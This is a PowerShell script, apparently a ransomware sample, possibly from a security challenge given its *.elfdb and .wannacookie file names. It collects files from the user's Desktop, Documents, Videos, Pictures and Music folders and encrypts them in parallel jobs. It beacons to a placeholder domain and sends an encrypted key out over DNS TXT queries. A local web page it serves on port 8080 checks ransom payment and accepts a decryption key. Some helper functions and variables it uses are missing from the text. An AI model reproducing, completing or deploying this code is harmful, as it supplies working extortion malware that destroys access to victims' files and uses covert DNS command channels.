function H2B {
    param($HX)
    $HX = $HX -split '(..)' | ? { $_ }
    ForEach ($value in $HX){
        [Convert]::ToInt32($value,16)
    }
}

function A2H(){
    Param($a)
    $c = ''
    $b = $a.ToCharArray();
    Foreach ($element in $b) {
        $c = $c + " " + [System.String]::Format("{0:X}", [System.Convert]::ToUInt32($element))
    }
    return $c -replace ' '
}

function H2A() {
    Param($a)
    $outa
    $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$outa = $outa + $_}
    return $outa
}
function B2H {
    param($DEC)
    $tmp = ''
    ForEach ($value in $DEC){
        $a = "{0:x}" -f [Int]$value
        if ($a.length -eq 1){
            $tmp += '0' + $a
        } else {
            $tmp += $a
        }
    }
    return $tmp
}
function ti_rox {
    param($b1, $b2)
    $b1 = $(H2B $b1)
    $b2 = $(H2B $b2)
    $cont = New-Object Byte[] $b1.count
    if ($b1.count -eq $b2.count) {
        for($i=0; $i -lt $b1.count ; $i++)
        {
            $cont[$i] = $b1[$i] -bxor $b2[$i]
        }   
    }
    return $cont
}
function B2G {
    param([byte[]]$Data)
    Process {
    $out = [System.IO.MemoryStream]::new()
    $gStream = New-Object System.IO.Compression.GzipStream $out, ([IO.Compression.CompressionMode]::Compress)

      $gStream.Write($Data, 0, $Data.Length)
      $gStream.Close()
    return $out.ToArray()
  }

}
function G2B {
param([byte[]]$Data)
	Process {
        $SrcData = New-Object System.IO.MemoryStream( , $Data )
	    $output = New-Object System.IO.MemoryStream
        $gStream = New-Object System.IO.Compression.GzipStream $SrcData, ([IO.Compression.CompressionMode]::Decompress)
	    $gStream.CopyTo( $output )
        $gStream.Close()
		$SrcData.Close()
		[byte[]] $byteArr = $output.ToArray()
        return $byteArr
    }
}
function Sha1([String] $String) {
    $SB = New-Object System.Text.StringBuilder
        [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
        [Void]$SB.Append($_.ToString("x2"))
    }
    $SB.ToString()
}

function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
     $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
     $cert.Import($pub_bytes)
     $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
     return $(B2H $encKey)
}
function enc_dec {
    param($key, $allfiles, $make_cookie )
    $tcount = 12
    for ( $file=0; $file -lt $allfiles.length; $file++  ) {
        while ($true) {
            $running = @(Get-Job | Where-Object { $_.State -eq 'Running' })
            if ($running.Count -le $tcount) {
                Start-Job  -ScriptBlock {
                    param($key, $File, $true_false)
                    try{
                        Enc_Dec-File $key $File $true_false
                    } catch {
                        $_.Exception.Message | Out-String | Out-File $($env:userprofile+'\Desktop\ps_log.txt') -append
                    }
                } -args $key, $allfiles[$file], $make_cookie -InitializationScript $functions
                break
            } else {
                Start-Sleep -m 200
                continue
            }
        }
    }
}

function get_over_dns($f) {
    $h = $(Resolve-DnsName -Server replacethisdomain.com -Name "$f.replacethisdomain.com" -Type TXT).Strings
    return ($h)
}
function split_to_chunks($astring, $size=32) {
    $new_arr = @()
    $chunk_index=0
    foreach($i in 1..$($astring.length / $size)) {
        $new_arr += @($astring.substring($chunk_index,$size))
        $chunk_index += $size
    }
    return $new_arr
}
function send_key($encrypted_key) {
    $chunks = (split_to_chunks $encrypted_key )
    foreach ($j in $chunks) {
        if ($chunks.IndexOf($j) -eq 0) {
            $new_cookie = $(Resolve-DnsName -Server replacethisdomain.com -Name "$j.6B6579666F72626F746964.replacethisdomain.com" -Type TXT).Strings
        } else {
            $(Resolve-DnsName -Server replacethisdomain.com -Name "$new_cookie.$j.6B6579666F72626F746964.replacethisdomain.com" -Type TXT).Strings
        }
    }
    return $new_cookie
}


function korat {
    # do not run on home system
    if ($(netstat -ano | Select-String "127.0.0.1:8080").length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "REPLACETHISDOMAIN") {return}

    #beacon once a day, if connection get ID#
    #fill this in later to beacon once between 6 and 7 $hour =  $(Get-Date).ToUniversalTime() | Select Hour
    $id = [System.Convert]::FromBase64String($((Resolve-DnsName -Server replacethisdomain.com -Name "626561636f6e.replacethisdomain.com" -Type TXT).Strings))







    
    [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprofile+'\Videos'),$($env:userprofile+'\Pictures'),$($env:userprofile+'\Music')) -Recurse | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
    enc_dec $Byte_key $future_cookies $true
    Clear-variable -Name "Hex_key"
    Clear-variable -Name "Byte_key"
    $lurl = 'http://127.0.0.1:8080/'
    $htmlcontents = @{
        'GET /'  =  $(get_over_dns (A2H "source.min.html"))
        'GET /close'  =  '<p>Bye!</p>'
    }
    Start-Job -ScriptBlock{
        param($url)
            Start-Sleep 10
            Add-type -AssemblyName System.Windows.Forms
            start-process "$url" -WindowStyle Maximized
            Start-sleep 2
            [System.Windows.Forms.SendKeys]::SendWait("{F11}")
    } -Arg $lurl
    $listener = New-Object System.Net.HttpListener
    $listener.Prefixes.Add($lurl)
    $listener.Start()
    try {
        $close = $false
        while ($listener.IsListening) {
            $context = $listener.GetContext()
            $Req = $context.Request
            $Resp = $context.Response
            $Resp.Headers.Add("Access-Control-Allow-Origin","*")
            $received = '{0} {1}' -f $Req.httpmethod, $Req.url.localpath
            if ($received -eq 'GET /') {
                $html = $htmlcontents[$received]
            } elseif ($received -eq 'GET /decrypt') {
                $akey = $Req.QueryString.Item("key")
                if ($Key_Hash -eq $(Sha1 $akey)) {
                    $akey = $(H2B $akey)
                    [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
                    enc_dec $akey $allcookies $false
                    $html = "Files have been decrypted!"
                    $close = $true
                } else {
                    $html = "Invalid Key!"
                }
            } elseif ($received -eq 'GET /close') {
                $close = $true
                $html = $htmlcontents[$received]
            } elseif ($received -eq 'GET /cookie_is_paid') {
                $cookie_and_key = $(Resolve-DnsName -Server replacethisdomain.com -Name ("$cookie_id.72616e736f6d697370616964.replacethisdomain.com".trim()) -Type TXT).Strings
                if ( $cookie_and_key.length -eq 32 ) {
                    $html = $cookie_and_key
                } else {
                    $html = "UNPAID|$cookie_id|$date_time"
                }
            } else {
                $Resp.statuscode = 404
                $html = '<h1>404 Not Found</h1>'
            }
            $buffer = [Text.Encoding]::UTF8.GetBytes($html)
            $Resp.ContentLength64 = $buffer.length
            $Resp.OutputStream.Write($buffer, 0, $buffer.length)
            $Resp.Close()
            if ($close) {
                $listener.Stop()
                return
            }
        }
    } finally {
        $listener.Stop()
    }    
}

korat
